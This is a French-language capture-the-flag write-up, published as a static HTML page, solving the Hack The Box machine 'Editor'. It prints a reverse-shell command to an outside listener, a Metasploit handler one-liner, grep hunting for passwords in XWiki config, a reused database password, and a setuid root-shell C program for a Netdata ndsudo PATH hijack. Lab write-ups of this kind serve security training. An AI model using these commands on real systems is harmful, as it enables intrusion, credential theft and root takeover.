@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Editor Writeup | Writeup</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="Editor Writeup" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Enumeration" />
+<meta property="og:description" content="Enumeration" />
+<link rel="canonical" href="/HTB/editor.html" />
+<meta property="og:url" content="/HTB/editor.html" />
+<meta property="og:site_name" content="Writeup" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-09-18T19:00:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Editor Writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-09-18T19:00:00+02:00","datePublished":"2025-09-18T19:00:00+02:00","description":"Enumeration","headline":"Editor Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"/HTB/editor.html"},"url":"/HTB/editor.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link rel="preload" href="https://fonts.googleapis.com/css?family=Open+Sans:400,700&display=swap" as="style" type="text/css" crossorigin>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#157878">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+  <body>
+    <a id="skip-to-content" href="#content">Skip to the content.</a>
+
+    <header class="page-header" role="banner">
+      <h1 class="project-name">Editor Writeup</h1>
+      <h2 class="project-tagline">Writeups & CTFs</h2>
+      
+      
+    </header>
+
+    <main id="content" class="main-content" role="main">
+      <h1 id="enumeration">Enumeration</h1>
+
+<p>On arrive sur une première page de présentation qui ne nous donne pas grand chose.</p>
+
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/editor%20images/Pasted%20image%2020251105160214.png"></span></p>
+
+<p>En revanche, en cliquant sur la page about, on est redirigé vers une page xwiki. Certes la page ne charge pas mais on voit tout de même que xwiki est présent.</p>
+
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/editor%20images/Pasted%20image%2020251105155753.png"></span></p>
+
+<p>En creusant un peu, on trouve un port de plus sur lequel on trouve notre instance xwiki.</p>
+
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/editor%20images/Pasted%20image%2020251105161253.png"></span></p>
+
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/editor%20images/Pasted%20image%2020251105160115.png"></span></p>
+
+<p>En descendant en bas de la page, on peut voir la version de cette instance xwiki.</p>
+
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/editor%20images/Pasted%20image%2020251105161548.png"></span></p>
+
+<p>On va donc chercher à exploiter cette version de xwiki en essayant de trouver une vulnérabilité.</p>
+
+<h1 id="foothold">Foothold</h1>
+
+<p>On cherche donc sur le site exploitDB et on trouve une CVE pour notre version de xwiki, par chance cela nous permet d’exécuter une RCE. On se rend donc sur github et on trouve une page qui nous permet de l’exploiter:</p>
+
+<p>https://github.com/gunzf0x/CVE-2025-24893</p>
+
+<p>On télécharge donc l’exploit et on le lance sur notre site editor.htb, après avoir lancé notre listener. Dans la commande on utilise busybox et non nc directement car busybox est plus souvent présent sur les box HTB.</p>
+
+<p>Ici le listener est un listener metasploit, que l’on peut lancer avec le one-liner</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfconsole -x "use exploit/multi/handler; set LHOST ATTACKER_IP; set LPORT 4444; set PAYLOAD linux/x86/shell_reverse_tcp;options"
+</code></pre></div></div>
+
+<p>Pour ceux qui n’utilisent pas trop meterpreter, c’est un module de metasploit, cela devrait rendre l’exploitation plus facile ensuite (on peut obtenir autant de shells que l’on veut facilement, le shell est automatiquement stabilisé quand il est transformé en meterpreter, on peut lancer des modules sur le shell qu’on a récupéré, …).</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 exploit.py -t 'http://editor.htb:8080' -c 'busybox nc 10.10.10.10 4444 -e /bin/bash'
+</code></pre></div></div>
+
+<p><span class="invalid-wiki-link"><span class="invalid-wiki-link">![[Pasted image 20251107151624.png]]</span></span></p>
+
+<p><span class="invalid-wiki-link"><span class="invalid-wiki-link">![[Pasted image 20251107151644.png]]</span></span></p>
+
+<p>Et juste comme ça on obtient notre meterpreter. On récupère un shell que l’on améliore un peu:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 -c 'import pty;pty.spawn("/bin/bash");'
+stty rows 24 cols 80
+export TERM=xterm-256color
+exec /bin/bash
+</code></pre></div></div>
+
+<h1 id="pivoting--lateral-movement">Pivoting / Lateral movement</h1>
+
+<p>On commence par chercher en regardant dans les recoins des dossiers, on cherche un peu dans les fichiers de config ce qu’on peut trouver. Si l’on ne trouve rien, on peut chercher sur internet les infos intéressantes. Or, il se trouve que les créateurs de xwiki nous donnent directement les infos dont on a besoin au lien suivant:
+https://www.xwiki.org/xwiki/bin/view/Documentation/AdminGuide/Configuration/</p>
+
+<p>Cela nous dit notamment de chercher dans le dossier <code class="language-plaintext highlighter-rouge">WEB-INF</code>, or il se trouve que l’on a croisé un dossier <code class="language-plaintext highlighter-rouge">WEB-INF</code> auparavant: <code class="language-plaintext highlighter-rouge">/usr/lib/xwiki/WEB-INF</code> dans lequel se trouve probablement le fichier qui nous intéresse.</p>
+
+<p>On peut faire, pour trouver le fichier, un grep sur le dossier:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>grep -R 'password' /usr/lib/xwiki/WEB-INF/
+</code></pre></div></div>
+<p>ou, pour les plus aventureux</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>grep -R 'password' /usr/lib/xwiki/
+</code></pre></div></div>
+
+<p>Mais on peut aussi cat un par un les fichiers de ce dossier.</p>
+
+<p>Dans tous les cas, on finit par trouver un fichier:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /usr/lib/xwiki/WEB-INF/hibernate.cfg.xml
+</code></pre></div></div>
+<p>qui nous donne des infos sur les db utilisées, notamment mysql.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    &lt;property name="hibernate.connection.url"&gt;jdbc:mysql://localhost/xwiki?useSSL=false&amp;amp;connectionTimeZone=LOCAL&amp;amp;allowPublicKeyRetrieval=true&lt;/property&gt;
+    &lt;property name="hibernate.connection.username"&gt;xwiki&lt;/property&gt;
+    &lt;property name="hibernate.connection.password"&gt;theEd1t0rTeam99&lt;/property&gt;
+    &lt;property name="hibernate.connection.driver_class"&gt;com.mysql.cj.jdbc.Driver&lt;/property&gt;
+    &lt;property name="hibernate.dbcp.poolPreparedStatements"&gt;true&lt;/property&gt;
+    &lt;property name="hibernate.dbcp.maxOpenPreparedStatements"&gt;20&lt;/property&gt;
+
+    &lt;property name="hibernate.connection.charSet"&gt;UTF-8&lt;/property&gt;
+    &lt;property name="hibernate.connection.useUnicode"&gt;true&lt;/property&gt;
+    &lt;property name="hibernate.connection.characterEncoding"&gt;utf8&lt;/property&gt;
+
+    &lt;mapping resource="xwiki.hbm.xml"/&gt;
+    &lt;mapping resource="feeds.hbm.xml"/&gt;
+    &lt;mapping resource="instance.hbm.xml"/&gt;
+    &lt;mapping resource="notification-filter-preferences.hbm.xml"/&gt;
+    &lt;mapping resource="mailsender.hbm.xml"/&gt;
+</code></pre></div></div>
+
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/editor%20images/Pasted%20image%2020251111002817.png"></span></p>
+
+<p>Les autres sont commentées, c’est bien celle-ci qui est utilisée. Une fois cela trouvé il ne nous reste plus qu’à utiliser les identifiants pour query la db. Avant toute chose on tente de se connecter en su puis en ssh. (On tente le ssh car si le su nous est interdit le message d’erreur sera le même que pour un mauvais mdp, aucun moyen de savoir).</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>theEd1t0rTeam99
+</code></pre></div></div>
+
+<p>Et nous voilà sur le compte d’oliver.</p>
+
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/editor%20images/Pasted%20image%2020251111135327.png"></span></p>
+
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+
+<p>En faisant une énumération des suids, on trouve une liste de fichiers intéressants, on lance la commande find.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -perm /4000 -print 2&gt;/dev/null
+</code></pre></div></div>
+<p>Et on obtient une liste de plugins netdata.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
+/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
+/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
+/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
+/opt/netdata/usr/libexec/netdata/plugins.d/ioping
+/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
+/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
+</code></pre></div></div>
+
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/editor%20images/Pasted%20image%2020251111142719.png"></span></p>
+
+<p>L’un d’eux retient notre attention: ndsudo. On regarde le fichier et on voit qu’il a bien le suid de set.</p>
+
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/editor%20images/Pasted%20image%2020251111190604.png"></span></p>
+
+<p>En cherchant rapidement sur internet on voit qu’une privesc est possible en utilisant ndsudo. En creusant encore plus, on trouve un site internet qui nous guide sur la privesc en utilisant ndsudo. Pour cela il nous suffit de placer un fichier exécutable malveillant, avec un nom dans la liste de ndsudo comme <code class="language-plaintext highlighter-rouge">nvme</code>.
+https://github.com/dollarboysushil/CVE-2024-32019-Netdata-ndsudo-PATH-Vulnerability-Privilege-Escalation</p>
+
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/editor%20images/Pasted%20image%2020251111213505.png"></span></p>
+
+<p>On écrit dans un fichier c, sur notre machine car editor n’a pas l’outil gcc, le code suivant.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+int main() {
+    setuid(0);
+    setgid(0);
+    execl("/bin/bash", "bash", NULL);
+    return 0;
+}
+</code></pre></div></div>
+<p>Que l’on compile en un fichier nommé <code class="language-plaintext highlighter-rouge">nvme</code>.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc -o nvme exploit.c
+</code></pre></div></div>
+<p>Pour ensuite l’upload sur notre machine victime.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>scp nvme oliver@editor.htb:/tmp/
+</code></pre></div></div>
+
+<p>On ajoute les droits d’exécution sur le fichier.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>export PATH=/home/oliver:$PATH
+chmod +x nvme
+</code></pre></div></div>
+<p>Puis on l’exécute</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
+</code></pre></div></div>
+
+<p>Et on obtient le root shell.</p>
+
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/editor%20images/Pasted%20image%2020251111214013.png"></span></p>
+<p>Et juste comme ça, on en a fini de la box!</p>
+
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/editor%20images/Pasted%20image%2020251111213808.png"></span></p>
+
+
+
+      <footer class="site-footer">
+        
+        <span class="site-footer-credits">This page was generated by <a href="https://pages.github.com">GitHub Pages</a>.</span>
+      </footer>
+    </main>
+  </body>
+</html>
